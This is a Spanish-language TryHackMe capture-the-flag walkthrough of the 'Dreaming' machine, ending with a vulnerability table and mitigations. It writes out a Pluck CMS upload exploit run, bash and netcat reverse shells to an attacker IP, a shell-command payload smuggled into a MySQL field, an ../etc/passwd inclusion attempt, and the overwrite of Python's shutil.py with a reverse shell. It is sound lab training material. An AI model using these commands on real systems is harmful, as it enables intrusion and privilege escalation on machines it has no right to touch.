# Dreaming

**Plataforma:** TryHackMe  
**Dificultad:** Fácil  
**Categoría:** Linux / Web / Pluck CMS / RCE / MySQL / Python / Privilege Escalation

## 1. Reconocimiento

### Nmap

- Lanzamos un escaneo para identificar los puertos y servicios:

```bash
nmap -sCV -Pn 10.130.178.56
```

- Encontramos:

- `22/tcp` → SSH
- `80/tcp` → HTTP

## 2. Enumeración

### Fuzzing web

- Realizamos fuzzing utilizando una wordlist grande:

```bash
ffuf -u http://10.130.178.56/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

- También probamos una wordlist más pequeña:

```bash
ffuf -u http://10.130.178.56/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

- Encontramos:

```text
/app/
```

- La ruta devuelve una redirección `301`.

- Dentro de `/app` encontramos:

```text
pluck-4.7.13/
```

- Accedemos a:

```text
http://10.130.178.56/app/pluck-4.7.13/
```

- También encontramos una ruta interesante:

```text
http://10.130.178.56/app/pluck-4.7.13/?file=dreaming
```

- Probamos un posible Local File Inclusion:

```text
http://10.130.178.56/app/pluck-4.7.13/?file=../../../../etc/passwd
```

- La aplicación bloquea esta petición.

### Enumeración de Pluck CMS

- Realizamos fuzzing dentro de la instalación:

```bash
ffuf -u http://10.130.178.56/app/pluck-4.7.13/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

- Encontramos:

```text
admin.php
data
docs
files
images
index.php
robots.txt
```

- Accedemos al panel:

```text
http://10.130.178.56/app/pluck-4.7.13/login.php
```

- Probamos credenciales comunes de Pluck CMS:

```text
Usuario: admin
Contraseña: password
```

- Las credenciales son correctas y conseguimos acceder al panel.

### Búsqueda de vulnerabilidades

- Identificamos:

```text
Pluck CMS 4.7.13
```

- Buscamos vulnerabilidades para esta versión y encontramos:

```text
Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)
CVE-2020-29607
```

## 3. Explotación

### Pluck CMS — CVE-2020-29607

- Utilizamos el exploit:

```bash
python3 49909.py 10.130.178.56 80 password /app/pluck-4.7.13
```

- Los parámetros corresponden a:

```text
IP
Puerto
Contraseña
Ruta donde está instalado Pluck CMS
```

- El exploit confirma la autenticación y sube una web shell:

```text
Authentification was succesfull, uploading webshell
Uploaded Webshell to:
http://10.130.178.56:80/app/pluck-4.7.13/files/shell.phar
```

- Accedemos a la web shell:

```text
http://10.130.178.56:80/app/pluck-4.7.13/files/shell.phar
```

- Conseguimos ejecutar comandos.

- Comprobamos el usuario:

```bash
whoami
```

- Obtenemos:

```text
www-data
```

### Reverse Shell

- En nuestra máquina nos ponemos a la escucha:

```bash
nc -lvnp 4444
```

- Desde la web shell ejecutamos:

```bash
bash -c 'bash -i >& /dev/tcp/192.168.132.185/4444 0>&1'
```

- Recibimos una reverse shell como `www-data`.

### Estabilizar la shell

- Ejecutamos:

```bash
script /dev/null -c bash
```

- Pulsamos:

```text
Ctrl + Z
```

- En nuestra máquina:

```bash
stty raw -echo
fg
```

- Después configuramos:

```bash
reset
export TERM=xterm
export SHELL=bash
stty rows 40 columns 120
```

- Ya tenemos una terminal más funcional.

### Enumeración de usuarios

- Revisamos `/home`:

```bash
ls /home
```

- Encontramos:

```text
death
lucien
morpheus
ubuntu
```

### Búsqueda de credenciales

- Investigamos los directorios personales y otros archivos en busca de credenciales, pero inicialmente no encontramos nada relevante.

- Continuamos enumerando el sistema y encontramos en `/opt` el archivo:

```text
/opt/test.py
```

- Sus permisos y propietario son:

```text
-rwxr-xr-x 1 lucien lucien 483 Aug 7 2023 test.py
```

- Revisamos el contenido:

```bash
cat /opt/test.py
```

- Encontramos:

```text
password = "HeyLucien#@1999!"
```

- También encontramos referencias a credenciales de MySQL:

```text
# MySQL credentials
DB_USER = "death"
DB_PASS = "#redacted"
DB_NAME = "library"
```

### Acceso como Lucien

- Utilizamos la contraseña encontrada para acceder mediante SSH:

```bash
ssh lucien@10.130.178.56
```

## 4. Escalada de privilegios

### De Lucien a Death

- Comprobamos los permisos de `sudo`:

```bash
sudo -l
```

- Encontramos:

```text
User lucien may run the following commands on ip-10-130-178-56:
    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```

- Esto significa que `lucien` puede ejecutar el script:

```text
/home/death/getDreams.py
```

como el usuario `death` sin proporcionar contraseña.

- Ejecutamos:

```bash
sudo -u death python3 /home/death/getDreams.py
```

- El script devuelve:

```text
Alice + Flying in the sky

Bob + Exploring ancient ruins

Carol + Becoming a successful entrepreneur

Dave + Becoming a professional musician
```

- El comportamiento del script parece estar relacionado con la información almacenada en una base de datos.

### Credenciales de MySQL

- Revisamos el historial de comandos:

```bash
cat $HOME/.bash_history
```

- Encontramos:

```bash
mysql -u lucien -plucien42DBPASSWORD
```

- Utilizamos estas credenciales para acceder a MySQL.

- Investigamos la base de datos y localizamos la tabla que utiliza `getDreams.py`.

### SQL Injection

- Insertamos una entrada maliciosa en la tabla `dreams`:

```sql
INSERT INTO dreams (dreamer, dream) VALUES ('s4cript', '$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.132.185 4444 >/tmp/f)');
```

- La idea es que el valor insertado termine siendo interpretado por el proceso que ejecuta el script.

- En nuestra máquina nos ponemos a la escucha:

```bash
nc -lvnp 4444
```

- Ejecutamos de nuevo el script como `death`:

```bash
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

- Recibimos una conexión como:

```text
death
```

- Conseguimos así la User Flag correspondiente al usuario `death`.

### De Death a Morpheus

- Continuamos con la enumeración utilizando LinPEAS.

- Encontramos que el archivo:

```text
/usr/lib/python3.8/shutil.py
```

es modificable por el grupo al que pertenece `death`.

- Esto es especialmente interesante porque `shutil` es un módulo estándar de Python y puede ser importado automáticamente por programas Python.

### Modificar `shutil.py`

- Sustituimos el contenido del archivo por una reverse shell:

```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",9003));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' > /usr/lib/python3.8/shutil.py
```

- Nos ponemos a la escucha:

```bash
nc -lvnp 9003
```

- Cuando un proceso Python importe `shutil`, se ejecutará nuestro código modificado.

- De esta forma conseguimos una nueva reverse shell y finalmente accedemos como `morpheus`.

- Obtenemos la flag:

```bash
cat /home/morpheus/morpheus_flag.txt
```

## 5. Reporte

- La máquina **Dreaming** expone SSH y HTTP.
- Mediante fuzzing encontramos `/app/` y una instalación de **Pluck CMS 4.7.13**.
- El panel de administración utiliza credenciales débiles:
```text
admin : password
```
- La versión es vulnerable a **CVE-2020-29607**, que permite RCE mediante subida de archivos autenticada.
- Utilizamos el exploit para subir una web shell y obtenemos acceso como `www-data`.
- Convertimos la web shell en una reverse shell y estabilizamos la terminal.
- Durante la enumeración encontramos `/opt/test.py`, que contiene una contraseña reutilizable de `lucien`.
- Accedemos mediante SSH como `lucien`.
- `sudo -l` muestra que `lucien` puede ejecutar `/home/death/getDreams.py` como `death`.
- Revisamos el historial y obtenemos credenciales de MySQL.
- Manipulamos la tabla utilizada por `getDreams.py` para introducir un payload que nos proporciona una reverse shell como `death`.
- Una vez como `death`, LinPEAS revela que `/usr/lib/python3.8/shutil.py` es modificable.
- Modificamos `shutil.py` para ejecutar una reverse shell cuando sea importado por un proceso Python.
- Conseguimos acceso como `morpheus` y obtenemos la flag correspondiente.

### Cadena de ataque

```text
Nmap
 ↓
HTTP
 ↓
/app/
 ↓
Pluck CMS 4.7.13
 ↓
Credenciales admin:password
 ↓
CVE-2020-29607
 ↓
File Upload RCE
 ↓
www-data
 ↓
/opt/test.py
 ↓
Credenciales de Lucien
 ↓
SSH
 ↓
lucien
 ↓
sudo -u death
 ↓
getDreams.py
 ↓
MySQL
 ↓
SQL Injection
 ↓
death
 ↓
LinPEAS
 ↓
shutil.py writable
 ↓
Python module hijacking
 ↓
morpheus
 ↓
Morpheus Flag
```

### Vulnerabilidades encontradas

| Vulnerabilidad | Severidad | Impacto |
|---|---|---|
| Credenciales por defecto de Pluck CMS | Alta | Acceso al panel administrativo |
| Pluck CMS 4.7.13 — CVE-2020-29607 | Crítica | RCE mediante subida de archivos |
| Contraseña reutilizada de `lucien` | Alta | Acceso mediante SSH |
| `getDreams.py` ejecutable como `death` | Alta | Escalada de usuario |
| SQL Injection / ejecución mediante datos de MySQL | Alta | Obtención de shell como `death` |
| `shutil.py` modificable | Crítica | Ejecución de código mediante importación de módulo |

### Mitigaciones

- Cambiar las credenciales por defecto de Pluck CMS.
- Actualizar Pluck CMS a una versión corregida.
- Validar correctamente los archivos subidos y evitar su ejecución.
- No reutilizar contraseñas entre aplicaciones y usuarios.
- Aplicar el principio de mínimo privilegio en reglas de `sudo`.
- Utilizar consultas parametrizadas para evitar SQL Injection.
- Proteger los módulos Python del sistema contra modificaciones por usuarios no privilegiados.
- Revisar permisos de archivos pertenecientes a librerías estándar.
- Mantener los componentes del sistema actualizados.

## 🧠 Lessons Learned

- Los CMS deben enumerarse por versión porque una versión concreta puede tener vulnerabilidades conocidas.
- Las credenciales por defecto siguen siendo un vector común de acceso inicial.
- Un archivo `.env`, script o archivo de configuración puede contener credenciales reutilizables.
- `sudo -l` permite descubrir cambios de usuario que pueden convertirse en vectores de escalada.
- El historial de comandos puede revelar credenciales directamente.
- Una aplicación que consulta una base de datos puede convertirse en un vector de inyección si no trata correctamente los datos almacenados.
- Los módulos Python estándar son sensibles a modificaciones porque pueden ser importados automáticamente por otros procesos.
- Un archivo Python escribible por un usuario sin privilegios puede convertirse en un vector de **module hijacking** y ejecución de código.
